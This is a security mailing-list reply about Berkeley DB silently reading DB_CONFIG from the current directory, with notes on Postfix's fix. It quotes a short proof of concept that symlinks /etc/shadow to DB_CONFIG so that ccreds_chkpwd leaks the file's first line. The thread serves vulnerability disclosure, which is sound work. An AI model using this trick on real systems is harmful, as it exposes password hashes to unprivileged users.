  oss-security - Re: Berkeley DB reads DB_CONFIG from cwd            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Wed, 14 Jun From: Solar Designer <solar@...nwall.com> To: oss-security@...ts.openwall.com Subject: Re: Berkeley DB reads DB_CONFIG from cwd  On Sun, Jun 11, at Jakub Wilk wrote: > Apparently Berkeley DB reads the DB_CONFIG configuration file from the  > current working directory by default[*]. This is surprising and AFAICT  > undocumented. >  > Here's how to exploit it against pam_ccreds: >  >    $ cat /etc/shadow >    cat: /etc/shadow: Permission denied >    $ ln -sf /etc/shadow DB_CONFIG >    $ /sbin/ccreds_chkpwd moo < /dev/null >    line 1:  >    incorrect  >    name-value pair >  > (The above was tested on Debian jessie.) >  > In the past, nss_db was also exploitable: > >  >  > [*] More precisely, this seem to happen when you call db_create() with  > dbenv=NULL; or if you use the dbm_open() function.  Postfix and legacy releases and were released working around this issue:      * Security: Berkeley DB versions 2 and later try to read settings     from a file DB_CONFIG in the current directory. This undocumented     feature may introduce undisclosed vulnerabilities resulting in     privilege escalation with Postfix set-gid programs (postdrop,     postqueue) before they chdir to the Postfix queue directory,     and with the postmap and postalias commands depending on whether     the user's current directory is writable by other users. This     fix does not change Postfix behavior for Berkeley DB versions     < 3, but it does reduce postmap and postalias 'create' performance     with Berkeley DB versions 3.0 .. 4.6.  The corresponding change log entry is from June 11 - looks like same day as Jakub's posting.  Alexander  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      